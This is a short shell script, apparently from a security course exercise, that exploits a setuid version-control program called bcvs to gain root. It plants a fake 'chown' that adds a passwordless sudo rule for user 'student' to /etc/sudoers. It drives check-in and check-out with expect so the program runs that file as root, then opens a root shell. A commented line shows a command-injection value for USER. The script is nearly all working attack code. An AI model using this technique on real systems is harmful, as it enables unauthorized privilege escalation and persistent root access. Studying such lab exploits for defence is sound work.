#setup
#USER=";/tmp/a.sh;"
touch /opt/bcvs/anything.txt

#setup the script to be ran as root by bcvs
touch /opt/bcvs/chown
chmod +x /opt/bcvs/chown
echo "
#!/bin/sh
printf "\nstudent ALL=(ALL) NOPASSWD: ALL\n" >> /etc/sudoers
" >> /opt/bcvs/chown

#checkin a valid file...
/usr/bin/expect -c '
sleep 0.5
spawn /opt/bcvs/bcvs ci /opt/bcvs/anything.txt
sleep 0.5
expect "Please write a SHORT explanation:\r"
sleep 0.5
send "naw\n"
sleep 0.5
'

#check it out so that the chown execlp runs...
/usr/bin/expect -c '
sleep 0.5
cd ~/test
sleep 0.5
spawn /opt/bcvs/bcvs co anything.txt
sleep 0.5
expect "Please write a SHORT explanation:\r"
sleep 0.5
send "no thanks\n"
sleep 0.5
'
sudo /bin/sh